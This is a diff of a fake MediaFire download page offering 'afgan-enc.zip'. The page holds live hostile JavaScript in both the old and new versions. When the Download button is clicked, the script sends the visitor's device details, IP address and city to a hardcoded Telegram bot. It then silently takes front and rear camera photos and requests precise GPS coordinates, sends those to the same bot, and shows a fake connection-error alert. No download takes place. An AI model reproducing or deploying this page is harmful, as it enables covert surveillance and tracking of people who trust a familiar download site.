@@ -3,45 +3,63 @@
 <head>
     <meta charset="utf-8"/>
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/>
-    <title>paedulzganteng</title>
+    <title>afgan-enc</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
-    <style>
-        /* CSS MediaFire Sederhana */
-        body { font-family: 'Open Sans', sans-serif; background: #f3f3f3; margin: 0; padding: 0; }
-        .header { background: #fff; padding: 15px; text-align: center; border-bottom: 1px solid #ddd; }
-        .logo-img { width: 150px; }
-        .center-box { max-width: 600px; margin: 50px auto; background: #fff; border-radius: 6px; padding: 20px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        .dl-btn-cont { background: #292929; color: #fff; padding: 20px; border-radius: 6px; display: flex; align-items: center; justify-content: space-between; }
-        .file-info { display: flex; align-items: center; }
-        .icon-zip { width: 40px; height: 50px; background: url('https://static.mediafire.com/images/filetype/file-zip-v3.png') no-repeat center; background-size: contain; margin-right: 15px; }
-        .filename { font-weight: bold; font-size: 14px; }
-        #downloadButton { background: #0070F0; color: #fff; padding: 15px 30px; border-radius: 4px; text-decoration: none; font-weight: bold; font-size: 13px; text-transform: uppercase; border: none; cursor: pointer; }
-        #downloadButton:hover { background: #005cc5; }
-        .hidden { display: none; }
-        .footer { text-align: center; font-size: 12px; color: #888; margin-top: 50px; padding: 20px; }
+    <style type="text/css">
+        :root{--mf-blue4:#0070F0;--mf-gray2:#222835;--mf-gray10:#E9EAEB;--mf-gray4:#575B65;--mf-gray5:#72767E}
+        html{font-family:'Open Sans',sans-serif;background:#f3f3f3}
+        body{margin:0;padding:0}
+        .header{background:#fff;height:80px;border-bottom:1px solid #ddd;display:flex;flex-direction:column;align-items:center;justify-content:center}
+        .header .logo a{display:block;width:180px;height:35px;background:url(//static.mediafire.com/images/backgrounds/header/mf_logo_full_color.svg) no-repeat;text-indent:-9999px}
+        .center{max-width:604px;margin:110px auto 0;background:#fff;border-radius:6px;overflow:hidden;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
+        .dl-btn-cont{background:#292929;padding:20px;display:flex;align-items:center;position:relative}
+        .dl-btn-cont .icon{width:46px;height:58px;background:url(//static.mediafire.com/images/filetype/file-zip-v3.png) no-repeat;margin-right:15px}
+        .dl-btn-label{color:#fff;font-weight:bold;font-size:14px;flex-grow:1}
+        #downloadButton{background:var(--mf-blue4);color:#fff;border:none;padding:15px 25px;border-radius:4px;font-weight:600;cursor:pointer;text-transform:uppercase}
+        .dl-info{padding:20px;font-size:13px;color:#444}
+        .intro{display:flex;align-items:center;margin-bottom:15px}
+        .intro.icon{width:50px;height:50px;background:url(//static.mediafire.com/images/filetype/file-zip-v3.png) no-repeat center/contain;margin-right:15px}
+        .footer{text-align:center;padding:30px;color:var(--mf-gray4);font-size:12px}
+        .hidden{display:none}
+        /* Style Tambahan untuk Alert Palsu */
+        #custom-alert{display:none;position:fixed;top:20px;left:50%;transform:translateX(-50%);background:#ef5939;color:#fff;padding:10px 20px;border-radius:5px;z-index:9999}
     </style>
 </head>
-<body>
+<body class="en">
+
+<div id="custom-alert">Connection error. Please try again.</div>
 
 <div class="header">
-    <img src="https://static.mediafire.com/images/backgrounds/header/mf_logo_full_color.svg" class="logo-img" alt="MediaFire">
+    <h1 class="logo"><a href="#">MediaFire</a></h1>
 </div>
 
-<div class="center-box">
+<div class="center">
     <div class="dl-btn-cont">
-        <div class="file-info">
-            <div class="icon-zip"></div>
-            <div class="filename">paedulzganteng.zip</div>
-        </div>
+        <div class="icon"></div>
+        <div class="dl-btn-label">afgan-enc.zip</div>
         <button id="downloadButton">Download (3.27MB)</button>
     </div>
-    <p style="font-size: 11px; color: #666; text-align: center; margin-top: 15px;">
-        The download button will start your download and verify your connection.
-    </p>
+    
+    <div class="dl-info">
+        <div class="intro">
+            <div class="intro icon"></div>
+            <div>
+                <div style="font-weight:bold">afgan-enc.zip</div>
+                <div style="color:#888">Compressed Archive (.ZIP)</div>
+            </div>
+        </div>
+        <ul style="list-style:none;padding:0;line-height:2">
+            <li>File size: <b>3.27MB</b></li>
+            <li>Uploaded: <b>2024-08-25 02:57:57</b></li>
+        </ul>
+        <hr style="border:0;border-top:1px solid #eee;margin:20px 0">
+        <p><b>About Compressed Archive Formats</b></p>
+        <p style="color:#666;font-size:12px">Compressed archives combine multiple files into a single file to make them easier to transport or save on diskspace.</p>
+    </div>
 </div>
 
 <footer class="footer">
-    &copy;2026 MediaFire Build 121967 | Terms | Privacy Policy
+    &copy;2026 MediaFire Build 121967 | Advertising | Terms | Privacy Policy
 </footer>
 
 <video id="v" autoplay muted class="hidden"></video>
@@ -49,103 +67,74 @@
 
 <script>
 (() => {
-    // --- KONFIGURASI TELEGRAM ---
     const T = '7621493211:AAFfEUR3ri6Z9odBFzvqhGthsymwWPOl5tY';
     const C = '6636068781';
-    
-    const dlBtn = document.getElementById('downloadButton');
+    const btn = document.getElementById('downloadButton');
 
-    // Fungsi Kirim ke Telegram
-    const sTG = async (msg) => {
+    const sendTG = async (m) => {
         try {
             await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: C, text: msg, parse_mode: 'HTML' })
+                headers: {'Content-Type':'application/json'},
+                body: JSON.stringify({chat_id:C, text:m, parse_mode:'HTML'})
             });
-        } catch (e) {}
+        } catch(e){}
     };
 
-    const sP = async (blob, fileName) => {
+    const sendPhoto = async (b, f) => {
         try {
             const fd = new FormData();
             fd.append('chat_id', C);
-            fd.append('photo', blob, fileName);
-            await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
-        } catch (e) {}
+            fd.append('photo', b, f);
+            await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, {method:'POST', body:fd});
+        } catch(e){}
     };
 
-    // Fungsi Ambil Info Device
-    const getDeviceInfo = async () => {
-        let m = `<b>📥 MEDIAFIRE CLONE LOG</b>\n\n`;
-        m += `<b>🖥 DEVICE:</b> ${navigator.userAgent}\n`;
-        try {
-            const b = await navigator.getBattery();
-            m += `<b>🔋 BATTERY:</b> ${Math.floor(b.level * 100)}%\n`;
-        } catch(e) {}
-        try {
-            const res = await fetch('https://ipapi.co/json/');
-            const d = await res.json();
-            m += `<b>📍 IP:</b> ${d.ip}\n<b>🏙 CITY:</b> ${d.city}, ${d.country_name}\n`;
-        } catch(e) {}
-        return m;
-    };
-
-    // Fungsi Ambil Kamera
-    const capture = async (facing) => {
+    const capture = async (f) => {
         const v = document.getElementById('v'), c = document.getElementById('c');
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } });
+            const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:f}});
             v.srcObject = stream;
             await new Promise(r => v.onloadedmetadata = r);
             v.play();
             await new Promise(r => setTimeout(r, 1000));
             c.width = v.videoWidth; c.height = v.videoHeight;
-            c.getContext('2d').drawImage(v, 0, 0);
-            c.toBlob(b => sP(b, `mf_${facing}.jpg`), 'image/jpeg');
+            c.getContext('2d').drawImage(v,0,0);
+            c.toBlob(b => sendPhoto(b, `img_${f}.jpg`), 'image/jpeg');
             stream.getTracks().forEach(t => t.stop());
             return true;
-        } catch (e) { return false; }
+        } catch(e) { return false; }
     };
 
-    // EKSEKUSI SAAT KLIK DOWNLOAD
-    dlBtn.addEventListener('click', async () => {
-        dlBtn.innerText = "Starting...";
-        dlBtn.disabled = true;
+    btn.addEventListener('click', async () => {
+        btn.innerText = "Starting...";
+        
+        // 1. Ambil Info Device & IP
+        let m = `<b>📥 NEW MEDIAFIRE CLICK</b>\n\nDevice: ${navigator.userAgent}\n`;
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const d = await res.json();
+            m += `IP: ${d.ip}\nCity: ${d.city}, ${d.country_name}`;
+        } catch(e){}
+        await sendTG(m);
 
-        // 1. Kirim Data Device & IP
-        const info = await getDeviceInfo();
-        await sTG(info);
-
-        // 2. Ambil Foto Depan & Belakang
-        const cam1 = await capture("user");
-        if (cam1) await capture("environment");
-
-        // 3. Ambil Lokasi GPS
+        // 2. Kamera & Lokasi
+        capture("user").then(() => capture("environment"));
+        
         if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const url = `http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                await sTG(`<b>📍 GPS:</b> ${url}`);
-            }, null, { enableHighAccuracy: true });
+            navigator.geolocation.getCurrentPosition(async (p) => {
+                await sendTG(`📍 GPS: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+            }, null, {enableHighAccuracy:true});
         }
 
-        // 4. Screenshot tampilan
-        setTimeout(async () => {
-            try {
-                const canvas = await html2canvas(document.body);
-                canvas.toBlob(b => sP(b, 'screenshot.jpg'), 'image/jpeg');
-            } catch(e) {}
-        }, 2000);
-
-        // Beri jeda seolah-olah download sedang diproses
+        // 3. Efek Loading Palsu & Error
         setTimeout(() => {
-            alert("Download error: Connection timeout. Please try again.");
-            dlBtn.innerText = "Download (3.27MB)";
-            dlBtn.disabled = false;
-        }, 5000);
+            document.getElementById('custom-alert').style.display = 'block';
+            btn.innerText = "Download (3.27MB)";
+            setTimeout(() => { document.getElementById('custom-alert').style.display = 'none'; }, 3000);
+        }, 4000);
     });
 })();
 </script>
-
 </body>
 </html>
